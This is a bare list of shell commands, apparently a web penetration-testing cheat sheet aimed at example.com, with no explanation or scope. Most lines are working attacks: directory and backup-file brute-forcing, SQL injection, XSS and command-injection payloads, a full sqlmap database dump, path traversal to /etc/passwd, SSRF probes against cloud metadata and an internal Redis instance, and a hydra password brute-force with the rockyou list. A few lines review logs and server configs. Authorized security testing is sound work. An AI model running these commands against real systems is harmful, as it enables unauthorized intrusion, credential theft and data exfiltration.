for path in admin api/private restricted secret user/profile .git/config backup.tar.gz config.php.bak .env .htaccess phpinfo.php server-status backup logs debug config.bak config.php.old config.save; do curl -s -I "example.com/$path" | grep "HTTP"; done
curl -H "Authorization: Bearer fake_token" example.com/secret
curl -b "session=invalid" example.com/user/profile
curl -X POST example.com/restricted
curl -s example.com/admin > /dev/null && echo "Admin page exists"
dirb example.com /usr/share/wordlists/dirb/big.txt -o dirb_results.txt
gobuster dir -u example.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,old -o gobuster_results.txt
nmap -p 80,443 --script http-methods,http-auth,http-security-headers,http-default-accounts,http-config-backup example.com -oN nmap_security_scan.txt
netstat -tuln | grep -v "127.0.0.1"
ss -tuln | grep -v "127.0.0.1"
testssl.sh example.com:443 > ssl_test_results.txt
sslyze --regular example.com:443 >> ssl_test_results.txt
nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-date -p 443 example.com -oN ssl_nmap_results.txt
grep -r "SSLProtocol" /etc/apache2 /etc/nginx
grep -r "SSLCipherSuite" /etc/apache2 /etc/nginx
for payload in "admin'--" "<script>alert(1)</script>" ";whoami" "1%20OR%201=1" "admin%27%20%23" "\";drop table users--"; do curl -s "example.com/search?query=$payload" | grep -i "error\|alert\|whoami"; done
sqlmap -u "example.com/search?id=1" --batch --dbs --tables --dump --risk=3 --level=5 -o
curl "example.com/file?path=../../../../etc/passwd"
curl "example.com/api?data=`whoami`"
nmap --script http-sql-injection,http-xss,http-phpself-xss -p 80 example.com
grep -r -E "hardcoded_password|secret_key|api_key|mysql_connect|exec\(|system\(|password=" /var/www/html
find /var/www -type f -name "*.php" -exec grep "eval(" {} \; -print
find /var/www -type f -name "*.bak" -o -name "*.log" -o -name "*.sql"
grep -r -E "disable_functions|allow_url_fopen|allow_url_include" /etc/php*
for url in "http://localhost:8080" "http://127.0.0.1" "file:///etc/passwd" "http://169.254.169.254" "gopher://localhost:6379"; do curl -s "example.com/api?url=$url" | grep -i "internal\|error"; done
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4
curl -c cookies.txt -d "username=admin&password=test" example.com/login
curl -b cookies.txt example.com/profile
curl -H "Cookie: session=expired" example.com
tail -f /var/log/auth.log | grep "failed"
cat /var/log/nginx/access.log /var/log/apache2/error.log | grep -i "error\|sql\|xss"
journalctl -u sshd --since "1 hour ago"
